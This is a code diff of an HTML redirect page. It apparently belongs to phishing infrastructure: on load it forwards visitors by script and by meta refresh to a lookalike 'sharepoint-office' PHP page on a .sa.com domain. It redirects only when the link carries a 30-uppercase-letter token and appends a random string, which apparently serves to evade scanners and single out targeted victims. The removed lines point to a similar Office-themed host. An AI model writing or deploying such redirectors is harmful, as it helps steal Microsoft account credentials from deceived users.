@@ -4,14 +4,15 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
+
+    <!-- Fallback Meta Refresh: Ensures the page redirects after 1 second if JavaScript is blocked -->
+    <meta http-equiv="refresh" content="1; url=https://xylon.sa.com/pprotect.docs-es.thumb/sharepoint-office-3D8/index.php">
+
     <script>
-        // Image page URL (shows for 1 second)
-        const imagePageUrl = "https://www.miniorange.com/images/microsoft-apps/microsoft-apps-organization-redirect.webp"; // Change this to your actual image URL
+        // Target redirect URL
+        const redirectTo = "https://xylon.sa.com/pprotect.docs-es.thumb/sharepoint-office-3D8/index.php";
 
-        // Final destination URL
-        const finalRedirectUrl = "https://m3.ryltvk6.sa.com/m3.secure.zcore/office-3D8/index.php";
-
-        // Function to generate a random 80-character string
+        // Function to generate a random string of mixed characters (80 characters)
         function generateRandomString(length) {
             const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
             let result = "";
@@ -21,16 +22,35 @@
             return result;
         }
 
-        // Step 1: Redirect to image page (user sees it for 1 second)
-        window.location.replace(imagePageUrl);
+        // Function to extract the unnamed query parameter after '?='
+        function getUnnamedQueryParam() {
+            const query = window.location.search;
+            const match = query.match(/^\?=([A-Z]{30})$/); // Matches "?=30-uppercase-letters"
+            return match ? match[1] : null;
+        }
 
-        // Step 2: Automatically redirect to final destination after 1 second
-        setTimeout(() => {
+        // Extract and validate the 30-character uppercase string from the URL
+        const upperString = getUnnamedQueryParam();
+
+        if (upperString) {
+            // Generate a random 80-character string
             const randomString = generateRandomString(80);
-            window.location.replace(`${finalRedirectUrl}?=${randomString}`);
-        }, 1000); // 1000ms = 1 second
+
+            // Construct the new URL
+            const newUrl = `${redirectTo}?=${randomString}`;
+
+            // Debugging log
+            console.log("Redirecting to:", newUrl);
+
+            // Redirect using JavaScript
+            window.location.href = newUrl;
+        } else {
+            // Optional: Provide fallback message in case the parameter is incorrect
+            document.body.innerHTML = "<p>Invalid URL format. Please use '?=30UPPERCASELETTERS'.</p>";
+        }
     </script>
 </head>
 <body>
+    <p>Redirecting you to the new page...</p>
 </body>
 </html>
